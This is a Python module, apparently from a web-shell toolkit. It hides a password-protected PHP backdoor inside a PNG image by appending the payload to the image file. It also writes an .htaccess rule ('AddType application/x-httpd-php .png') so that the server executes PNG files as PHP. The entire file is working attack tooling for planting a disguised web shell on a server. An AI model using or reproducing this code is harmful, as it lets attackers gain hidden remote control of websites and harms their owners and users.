
from core.parameters import ParametersList, Parameter as P
from core.module import Module, ModuleException
from core.backdoor import Backdoor
from os import path

classname = 'Png'

class Png(Module):

    htaccess_template = '''AddType application/x-httpd-php .png
'''


    params = ParametersList('Inject backdoor in PNG image and create .htaccess', [],
                        P(arg='png_path', help='Input PNG image path', required=True, pos=0),
                        P(arg='htpath', help='Output .htaccess path', default='.htaccess', pos=1))



    def __init__( self, modhandler , url, password):
        """ Avoid to load default interpreter """
        self.backdoor = Backdoor(password)
        self.modhandler = modhandler
        self.modhandler.interpreter = True
        
        self.password = password
        self.name = self.__module__[8:]


    def run_module( self, filename, htaccess_path ):

        if not path.exists(filename):
            raise ModuleException(self.name, "File %s not found" % filename)
        
        out = file( filename, 'ab' )
        out.write( str(self.backdoor).replace('\n',' '))
        out.close()

        hout = file( htaccess_path, 'wt' )
        hout.write( self.htaccess_template )
        hout.close()

        self.mprint("[%s] File '%s' backdoored with password '%s'. Htaccess file '%s' created." % ( self.name, filename, self.password, htaccess_path ))
